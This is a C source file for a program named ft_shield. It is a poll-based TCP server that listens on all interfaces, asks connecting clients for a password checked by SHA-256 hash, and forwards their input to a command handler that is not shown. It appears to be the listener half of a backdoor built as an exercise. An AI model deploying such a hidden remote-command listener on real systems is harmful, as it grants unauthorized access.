#include <ft_shield.h>

void remove_client(t_server *server, int client_fd)
{
    for (int i = 0; i < MAX_CLIENTS + 1; i++) {
        if (server->pfds[i].fd == client_fd) {
            shutdown(server->pfds[i].fd, SHUT_RDWR);
            close(server->pfds[i].fd);
            server->pfds[i] = (struct pollfd){-1, POLLIN, 0};
            server->clients[i].logged = 0;
            server->connected_clients--;
            return ;
        }
    }
}

static void _handle_client_input(t_server *server, int client_fd, int pfd_index)
{
    int len_read;
	char buffer[BUFFER_SIZE];

	bzero(&buffer, BUFFER_SIZE);
	if ((len_read = recv(client_fd, buffer, BUFFER_SIZE, 0)) <= 0) {
        remove_client(server, client_fd);
        return ;
    }
    buffer[len_read - 1] = '\0';
    if (!server->clients[pfd_index].logged)
    {
            unsigned char password_hash[SHA256_DIGEST_LENGTH];
            hash_sha256(buffer, password_hash);
            if (check_password(password_hash)) {
                server->clients[pfd_index].logged = 1;
                send_to_client(server, client_fd, "$> ");
            }
            else
                send_to_client(server, client_fd, "Password: ");
    } else {
        handle_command(server, client_fd, buffer);
        send_to_client(server, client_fd, "$> ");
    }
}

static void _handle_connection(t_server *server)
{
    struct sockaddr_in client;
	socklen_t client_len = sizeof(client);
    int client_fd;

    if ((client_fd = accept(server->server_socket, (struct sockaddr *)&client, &client_len)) == -1)
        return ;
    if (server->connected_clients >= MAX_CLIENTS)
    {
        send(client_fd, "ft_shield: Connection refused\r\n", 32, 0);
        close(client_fd);
        return ;
    }
    for (int i = 0; i < MAX_CLIENTS + 1; i++) {
        if (server->pfds[i].fd == -1) {
            server->pfds[i].fd = client_fd;
            server->pfds[i].events = POLLIN;
            server->clients[i] = (t_client){0};
            server->connected_clients++;
            break;
        }
    }
    send_to_client(server, client_fd, "Password: ");
}

static void loop_server(t_server *server)
{
    while (1)
    {
        if (poll(server->pfds, server->connected_clients + 1, -1) <= 0)
            break ;
        for (int i = 0; i < server->connected_clients + 1; i++)
        {
            if (server->pfds[i].revents & POLLIN)
            {
                if (server->pfds[i].fd == server->server_socket)
                    _handle_connection(server);
                else
                    _handle_client_input(server, server->pfds[i].fd, i);
            }
        }
    }
}

static int setup_server(void)
{
    int server_socket;
    struct sockaddr_in server_address;

    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        exit(EXIT_FAILURE);

    int opt = 1;
	if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1)
	{
		close(server_socket);
		exit(EXIT_FAILURE);
	}
    server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = htons(PORT);
    if (bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address)) == -1)
	{
		close(server_socket);
		exit(EXIT_FAILURE);
	}
    if (listen(server_socket, MAX_CLIENTS) == -1)
	{
		close(server_socket);
		exit(EXIT_FAILURE);
	}
    return server_socket;
}

static void reset_clients(t_server *server)
{
    for (int i = 0; i < MAX_CLIENTS + 1; i++)
    {
        server->clients[i].logged = false;
        server->pfds[i] = (struct pollfd){-1, POLLIN, 0};;
    }
}

void server(void)
{
    t_server server;
    server.connected_clients = 0;

    reset_clients(&server);
    server.server_socket = setup_server();
    server.pfds[0] = (struct pollfd){server.server_socket, POLLIN, 0};
    server.clients[0] = (t_client){1};;
    loop_server(&server);
}

void send_to_client(t_server* server, int client_fd, char* buffer)
{
    if (send(client_fd, buffer, strlen(buffer), 0) == -1)
        remove_client(server, client_fd);
}
